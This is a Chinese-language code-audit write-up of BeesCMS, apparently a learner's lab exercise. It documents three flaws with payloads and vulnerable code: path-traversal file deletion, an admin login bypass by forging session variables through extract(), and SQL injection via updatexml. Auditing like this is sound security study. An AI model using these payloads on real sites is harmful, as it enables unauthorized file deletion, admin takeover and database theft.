第一套审计的php,cms,希望挖的到洞

seay 先扫
### 任意文件删除漏洞
##### 漏洞url
/admin/admin_ajax.php
##### payload
`http://audit:81/beescms/admin/admin_ajax.php?action=del_pic&value=../../../../../../../../../../../../../../../1.php`
##### 相关代码
```php
elseif($action=='del_pic'){
    phpinfo();
$file=CMS_PATH.'upload/'.$value;
	 @unlink($file);
	die("图片成功删除");
}
```

---
借鉴
### 后台登录绕过


##### 漏洞url
包含了 `include/init.php` 的路径
##### payload
`_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=8888888888888`
##### 相关代码
```php
//检查登陆
if(!is_login()){header('location:login.php');exit;}
// is_login() 的实现
function is_login(){
	if($_SESSION['login_in']==1&&$_SESSION['admin']){
		if(time()-$_SESSION['login_time']>3600){
			login_out();
		}else{
			$_SESSION['login_time']=time();
			@session_regenerate_id();
		}
		return 1;
	}else{
		$_SESSION['admin']='';
		$_SESSION['admin_purview']='';
		$_SESSION['admin_id']='';
		$_SESSION['admin_time']='';
		$_SESSION['login_in']='';
		$_SESSION['login_time']='';
		$_SESSION['admin_ip']='';
		return 0;
	}
}
```

如果存在变量覆盖则可以伪造session,全局搜索 `extract` 函数,在 `includes/init.php` 
```php
if (isset($_REQUEST)){$_REQUEST  = fl_value($_REQUEST);}
    $_COOKIE   = fl_value($_COOKIE);
	$_GET = fl_value($_GET);
@extract($_POST);
@extract($_GET);
@extract($_COOKIE);
```

##### 漏洞分析
很直接的进行了变量覆盖,只要在包含了该文件下的目录里发送
`_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=8888888888888` 即可成功伪造session


### SQL注入
##### 漏洞url
`admin/admin_ajax.php`
##### payload
`?action=order&table=admin&field=admin_mail=111 or updatexml(1,concat(0x23,user()),1)--+`
##### 相关代码
```php
elseif($action=='order'){
	$table=$_REQUEST['table'];
	$field = $_REQUEST['field'];
	$id = intval($_REQUEST['id']);
	$sql="update ".DB_PRE."{$table} set {$field}=".intval($value)." where id={$id}";
	$GLOBALS['mysql']->query($sql);
	//更新缓存
		if($table=="lang"){	
			$sql="select*from ".DB_PRE."{$table} order by {$field} desc";
			$rel=$GLOBALS['mysql']->fetch_asc($sql);
		$cache_file=DATA_PATH.'cache/lang_cache.php';
		$str="<?php\n\$lang_cache=".var_export($rel,true).";\n?>";
		}elseif($table=="channel"){
			$sql="select*from ".DB_PRE."{$table} order by {$field} desc";
			$rel=$GLOBALS['mysql']->fetch_asc($sql);
			$cache_file=DATA_PATH.'cache_channel/cache_channel_all.php';
			$str="<?php\n\$channel=".var_export($rel,true).";\n?>";
		}
		creat_inc($cache_file,$str);
	
}
```

##### 漏洞分析
对`field` 没有进行鉴权,直接拼接导致漏洞

